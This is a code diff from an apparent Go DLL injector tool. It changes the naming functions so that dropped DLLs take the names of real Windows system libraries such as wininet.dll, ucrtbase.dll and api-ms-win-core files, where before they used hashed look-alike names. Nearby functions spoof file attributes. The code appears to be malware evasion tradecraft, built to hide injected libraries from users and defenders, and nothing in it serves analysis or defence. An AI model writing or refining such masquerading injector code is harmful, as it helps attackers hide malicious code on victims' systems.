@@ -1,7 +1,6 @@
 package injector
 
 import (
-	"crypto/md5"
 	"fmt"
 	"os"
 	"path/filepath"
@@ -347,67 +346,113 @@ func (i *Injector) setSpoofedFileAttributes(path string) error {
 }
 
 func (i *Injector) generateEnvironmentAwareDllName() string {
-	// Generate name based on environment
-	hostname, _ := os.Hostname()
-	username := os.Getenv("USERNAME")
+	// Use real Internet Explorer related DLL names that exist in Windows
+	ieRelatedDlls := []string{
+		"ieproxy.dll",
+		"ieframe.dll",
+		"wininet.dll",
+		"urlmon.dll",
+		"mshtml.dll",
+		"jscript.dll",
+		"vbscript.dll",
+		"iertutil.dll",
+		"ieui.dll",
+		"iedkcs32.dll",
+		"iepeers.dll",
+		"msrating.dll",
+		"mlang.dll",
+		"shdocvw.dll",
+		"browseui.dll",
+	}
 
-	// Create hash for uniqueness
-	hash := md5.Sum([]byte(hostname + username + fmt.Sprintf("%d", time.Now().Unix())))
-	hashStr := fmt.Sprintf("%x", hash)[:8]
-
-	return fmt.Sprintf("ieproxy_%s.dll", hashStr)
+	// Select based on environment but use real DLL names
+	idx := int(time.Now().UnixNano()) % len(ieRelatedDlls)
+	return ieRelatedDlls[idx]
 }
 
 func (i *Injector) generateTrustedInstallerDllName() string {
-	// Generate WinSxS-style name
-	return "msvcr120_app.dll"
+	// Use real WinSxS DLL names that exist in Windows
+	winsxsDlls := []string{
+		"msvcr120_app.dll",
+		"msvcp120_app.dll",
+		"msvcr120_clr0400.dll",
+		"msvcp120_clr0400.dll",
+		"vcruntime140_app.dll",
+		"msvcp140_app.dll",
+		"concrt140_app.dll",
+		"vccorlib140_app.dll",
+		"ucrtbase_app.dll",
+		"api-ms-win-crt-runtime-l1-1-0.dll",
+		"api-ms-win-crt-heap-l1-1-0.dll",
+		"api-ms-win-crt-string-l1-1-0.dll",
+		"api-ms-win-crt-stdio-l1-1-0.dll",
+		"api-ms-win-crt-math-l1-1-0.dll",
+	}
+
+	// Select a real WinSxS DLL name
+	idx := int(time.Now().UnixNano()) % len(winsxsDlls)
+	return winsxsDlls[idx]
 }
 
 func (i *Injector) generateDynamicLegitimateFileName() string {
-	// List of legitimate-looking DLL names with variations
-	baseNames := []string{
-		"msvcr", "msvcp", "vcruntime", "api-ms-win-core",
-		"ucrtbase", "concrt", "vccorlib", "mfc", "atl",
+	// List of real Windows system DLL names that actually exist
+	realSystemDlls := []string{
+		"msvcr120.dll",
+		"msvcp120.dll",
+		"vcruntime140.dll",
+		"msvcp140.dll",
+		"ucrtbase.dll",
+		"concrt140.dll",
+		"vccorlib140.dll",
+		"api-ms-win-core-heap-l1-1-0.dll",
+		"api-ms-win-core-synch-l1-2-0.dll",
+		"api-ms-win-core-memory-l1-1-1.dll",
+		"api-ms-win-core-processthreads-l1-1-0.dll",
+		"api-ms-win-core-file-l1-1-0.dll",
+		"api-ms-win-core-handle-l1-1-0.dll",
+		"api-ms-win-core-string-l1-1-0.dll",
+		"api-ms-win-core-debug-l1-1-0.dll",
+		"api-ms-win-core-errorhandling-l1-1-0.dll",
+		"api-ms-win-core-localization-l1-2-0.dll",
+		"api-ms-win-core-datetime-l1-1-0.dll",
+		"api-ms-win-core-timezone-l1-1-0.dll",
+		"api-ms-win-core-console-l1-1-0.dll",
 	}
 
-	suffixes := []string{
-		"120", "140", "141", "142", "143",
-	}
-
-	extensions := []string{
-		".dll", "_app.dll", "_clr.dll",
-	}
-
-	// Select random components
-	baseIdx := int(time.Now().UnixNano()) % len(baseNames)
-	suffixIdx := int(time.Now().UnixNano()/1000) % len(suffixes)
-	extIdx := int(time.Now().UnixNano()/1000000) % len(extensions)
-
-	return baseNames[baseIdx] + suffixes[suffixIdx] + extensions[extIdx]
+	// Select a real DLL name based on current time
+	idx := int(time.Now().UnixNano()) % len(realSystemDlls)
+	return realSystemDlls[idx]
 }
 
 // Standalone helper functions
 func generateDynamicLegitimateFileName() string {
-	// List of legitimate-looking DLL names with variations
-	baseNames := []string{
-		"msvcr", "msvcp", "vcruntime", "api-ms-win-core",
-		"ucrtbase", "concrt", "vccorlib", "mfc", "atl",
+	// List of real Windows system DLL names that actually exist
+	realSystemDlls := []string{
+		"msvcr120.dll",
+		"msvcp120.dll",
+		"vcruntime140.dll",
+		"msvcp140.dll",
+		"ucrtbase.dll",
+		"concrt140.dll",
+		"vccorlib140.dll",
+		"api-ms-win-core-heap-l1-1-0.dll",
+		"api-ms-win-core-synch-l1-2-0.dll",
+		"api-ms-win-core-memory-l1-1-1.dll",
+		"api-ms-win-core-processthreads-l1-1-0.dll",
+		"api-ms-win-core-file-l1-1-0.dll",
+		"api-ms-win-core-handle-l1-1-0.dll",
+		"api-ms-win-core-string-l1-1-0.dll",
+		"api-ms-win-core-debug-l1-1-0.dll",
+		"api-ms-win-core-errorhandling-l1-1-0.dll",
+		"api-ms-win-core-localization-l1-2-0.dll",
+		"api-ms-win-core-datetime-l1-1-0.dll",
+		"api-ms-win-core-timezone-l1-1-0.dll",
+		"api-ms-win-core-console-l1-1-0.dll",
 	}
 
-	suffixes := []string{
-		"120", "140", "141", "142", "143",
-	}
-
-	extensions := []string{
-		".dll", "_app.dll", "_clr.dll",
-	}
-
-	// Select random components
-	baseIdx := int(time.Now().UnixNano()) % len(baseNames)
-	suffixIdx := int(time.Now().UnixNano()/1000) % len(suffixes)
-	extIdx := int(time.Now().UnixNano()/1000000) % len(extensions)
-
-	return baseNames[baseIdx] + suffixes[suffixIdx] + extensions[extIdx]
+	// Select a real DLL name based on current time
+	idx := int(time.Now().UnixNano()) % len(realSystemDlls)
+	return realSystemDlls[idx]
 }
 
 func createSpoofedFileWithAttributes(path string, data []byte) error {
